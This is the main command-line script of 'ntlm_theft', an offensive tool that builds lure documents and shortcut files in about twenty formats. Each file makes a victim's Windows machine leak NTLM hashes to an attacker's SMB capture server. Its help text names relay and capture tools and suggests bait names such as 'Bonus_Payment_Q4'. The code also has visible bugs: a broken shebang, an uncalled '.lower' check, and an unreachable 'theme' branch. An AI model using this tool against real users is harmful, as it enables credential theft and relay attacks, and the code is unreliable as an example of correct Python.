#!/usr/bin/env
# -*- coding: utf-8 -*-
from __future__ import print_function

import argparse
import os
import shutil
from sys import exit

from ntlm_theft.files import (
    create_scf,
    create_bat,
    create_url_url,
    create_url_icon,
    create_lnk,
    create_rtf,
    create_xml,
    create_xml_includepicture,
    create_htm,
    create_htm_handler,
    create_docx_includepicture,
    create_docx_remote_template,
    create_docx_frameset,
    create_xlsx_externalcell,
    create_wax,
    create_m3u,
    create_asx,
    create_jnlp,
    create_application,
    create_pdf,
    create_zoom,
    create_theme,
    create_autoruninf,
    create_desktopini,
    create_new_libraryms,
    create_legacy_libraryms,
    create_odt_ntlm_leak,
)


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="ntlm_theft by Jacob Wilkin(Greenwolf)",
        usage="%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>",
    )
    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version="%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)",
    )
    parser.add_argument(
        "-vv", "--verbose", action="store_true", dest="vv", help="Verbose Mode"
    )
    parser.add_argument(
        "-g",
        "--generate",
        action="store",
        dest="generate",
        required=True,
        choices=set(
            (
                "odt",
                "modern",
                "all",
                "scf",
                "bat",
                "url",
                "lnk",
                "rtf",
                "xml",
                "htm",
                "docx",
                "xlsx",
                "wax",
                "m3u",
                "asx",
                "jnlp",
                "application",
                "pdf",
                "zoom",
                "new-libraryms",
                "legacy-libraryms",
                "autoruninf",
                "desktopini",
            )
        ),
        help="Choose to generate all files or a specific filetype",
    )
    parser.add_argument(
        "-s",
        "--server",
        action="store",
        dest="server",
        required=True,
        help="The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)",
    )
    parser.add_argument(
        "-f",
        "--filename",
        action="store",
        dest="filename",
        required=True,
        help="The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)",
    )
    args = parser.parse_args()

    if os.path.exists(args.filename):
        if input(
            f"Are you sure to want to delete {args.filename}? [Y/N]"
        ).lower not in [
            "y",
            "yes",
        ]:
            exit(0)
        shutil.rmtree(args.filename)
    os.makedirs(args.filename)

    # handle which documents to create
    if args.generate == "all" or args.generate == "modern":
        create_scf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".scf"),
        )

        create_bat(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".bat"),
        )

        create_url_url(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(url).url"),
        )
        create_url_icon(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(icon).url"),
        )

        create_lnk(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".lnk"),
        )

        create_rtf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".rtf"),
        )

        create_xml(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(stylesheet).xml"),
        )
        create_xml_includepicture(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(fulldocx).xml"),
        )

        create_htm(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".htm"),
        )
        create_htm_handler(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(handler).htm"),
        )

        create_docx_includepicture(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(includepicture).docx"),
        )
        create_docx_remote_template(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(remotetemplate).docx"),
        )
        create_docx_frameset(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(frameset).docx"),
        )

        create_xlsx_externalcell(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(externalcell).xlsx"),
        )

        create_wax(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".wax"),
        )

        create_m3u(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".m3u"),
        )

        create_asx(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".asx"),
        )

        create_jnlp(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".jnlp"),
        )

        create_application(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".application"),
        )

        create_pdf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".pdf"),
        )

        create_zoom(
            args.generate,
            args.server,
            os.path.join(args.filename, "zoom-attack-instructions.txt"),
        )

        create_new_libraryms(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(new).library-ms"),
        )

        create_legacy_libraryms(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(legacy).library-ms"),
        )

        create_autoruninf(
            args.generate, args.server, os.path.join(args.filename, "Autorun.inf")
        )

        create_desktopini(
            args.generate, args.server, os.path.join(args.filename, "desktop.ini")
        )

        create_theme(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".theme"),
        )

    elif args.generate == "odt":
        create_odt_ntlm_leak(
            args.server, os.path.join(args.filename, args.filename + ".odt")
        )

    elif args.generate == "scf":
        create_scf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".scf"),
        )

    elif args.generate == "url":
        create_url_url(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(url).url"),
        )
        create_url_icon(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(icon).url"),
        )

    elif args.generate == "lnk":
        create_lnk(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".lnk"),
        )

    elif args.generate == "rtf":
        create_rtf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".rtf"),
        )

    elif args.generate == "xml":
        create_xml(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(stylesheet).xml"),
        )
        create_xml_includepicture(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(fulldocx).xml"),
        )

    elif args.generate == "htm":
        create_htm(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".htm"),
        )

    elif args.generate == "docx":
        create_docx_includepicture(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(includepicture).docx"),
        )
        create_docx_remote_template(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(remotetemplate).docx"),
        )
        create_docx_frameset(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(frameset).docx"),
        )

    elif args.generate == "xlsx":
        create_xlsx_externalcell(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + "-(externalcell).xlsx"),
        )

    elif args.generate == "wax":
        create_wax(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".wax"),
        )

    elif args.generate == "m3u":
        create_m3u(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".m3u"),
        )

    elif args.generate == "asx":
        create_asx(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".asx"),
        )

    elif args.generate == "jnlp":
        create_jnlp(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".jnlp"),
        )

    elif args.generate == "application":
        create_application(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".application"),
        )

    elif args.generate == "pdf":
        create_pdf(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".pdf"),
        )

    elif args.generate == "zoom":
        create_zoom(
            args.generate,
            args.server,
            os.path.join(args.filename, "zoom-attack-instructions.txt"),
        )

    elif args.generate == "new-libraryms":
        create_new_libraryms(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".library-ms"),
        )

    elif args.generate == "legacy-libraryms":
        create_legacy_libraryms(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".library-ms"),
        )

    elif args.generate == "autoruninf":
        create_autoruninf(
            args.generate, args.server, os.path.join(args.filename, "Autorun.inf")
        )

    elif args.generate == "desktopini":
        create_desktopini(
            args.generate, args.server, os.path.join(args.filename, "desktop.ini")
        )

    elif args.generate == "theme":
        create_theme(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".theme"),
        )

    elif args.generate == "bat":
        create_bat(
            args.generate,
            args.server,
            os.path.join(args.filename, args.filename + ".bat"),
        )

    print("Generation Complete.")


if __name__ == "__main__":
    main()
